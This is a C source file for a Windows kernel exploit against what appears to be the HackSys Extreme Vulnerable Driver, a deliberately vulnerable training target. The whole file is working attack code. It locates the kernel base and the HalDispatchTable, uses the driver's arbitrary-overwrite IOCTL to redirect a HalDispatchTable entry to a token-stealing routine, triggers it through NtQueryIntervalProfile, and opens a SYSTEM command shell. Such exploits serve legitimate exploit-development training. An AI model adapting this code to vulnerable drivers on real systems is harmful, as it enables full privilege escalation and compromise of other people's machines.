#include "ArbitraryOverwrite.h"

int wmain(int argc, wchar_t* argv[])
{
	NtQueryIntervalProfile_t NtQueryIntervalProfile;
	PWRITE_WHAT_WHERE pWriteWhatWhere = NULL;
	PDEVICE_DRIVER_INFO pNtoskrnlInfo = NULL;
	PVOID shellcodeAddr = NULL;
	PVOID halTableAddr = NULL;
	LPCSTR lpFileName = NULL;
	HMODULE hNtdll = NULL;
	HANDLE hFile = NULL;
	DWORD bytesReturned;
	ULONG Interval = 0;

	pNtoskrnlInfo = GetNtBaseAddr();
	if (NULL == pNtoskrnlInfo)
	{
		return -1;
	}

	printf("[+] The address of %s is 0x%p\n", pNtoskrnlInfo->imageName, pNtoskrnlInfo->imageBaseAddr);
	 
	halTableAddr = GetHalTableAddr(pNtoskrnlInfo);
	if (NULL == halTableAddr)
	{
		return -1;
	}

	printf("[+] The address of HalDispatchTable is 0x%p\n", halTableAddr);

	pWriteWhatWhere = (PWRITE_WHAT_WHERE)HeapAlloc(
			GetProcessHeap(),
			HEAP_ZERO_MEMORY,
			sizeof(WRITE_WHAT_WHERE)
		);
	if (NULL == pWriteWhatWhere)
	{
		printf("[-] Allocate memory failed, the error code is 0x%X\n", GetLastError());

		return -1;
	}

	shellcodeAddr = StealSystemToken;
	pWriteWhatWhere->what = (PULONG_PTR)&shellcodeAddr;
	pWriteWhatWhere->where = (PULONG_PTR)((ULONG_PTR)halTableAddr+4);


	printf("[+] pWriteWhatWhere->what: 0x%p\n", pWriteWhatWhere->what);
	printf("[+] pWriteWhatWhere->where: 0x%p\n", pWriteWhatWhere->where);

	lpFileName = (LPCSTR)DEVICE_NAME;
	
	hFile = GetDeviceHandle(lpFileName);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("[-] Get device handle failed, the error code is 0x%X\n", GetLastError());

		return -1;
	}

	if (!DeviceIoControl(
		hFile,
		HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,
		(LPVOID)pWriteWhatWhere,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0,
		&bytesReturned,
		NULL))
	{
		printf("[-] DeviceIoControl failed, the error code is 0x%X\n", GetLastError());

		return -1;
	}

	hNtdll = LoadLibraryA("ntdll.dll");
	if (NULL == hNtdll)
	{
		printf("[-] Load library failed, the error code is 0x%X\n", GetLastError());

		return -1;
	}

	NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(hNtdll, "NtQueryIntervalProfile");
	if (NULL == NtQueryIntervalProfile)
	{
		printf("[-] Resolve NtQueryIntervalProfile failed, the error code is 0x%X\n", GetLastError());

		return -1;
	}

	NtQueryIntervalProfile(0x1337, &Interval);

	if (!HeapFree(GetProcessHeap(), 0, (LPVOID)pWriteWhatWhere))
	{
		printf("[-] Free memory failed, the error code is 0x%X\n", GetLastError());

		return -1;
	}

	pWriteWhatWhere = NULL;

	system("cmd.exe");

	return 0;

}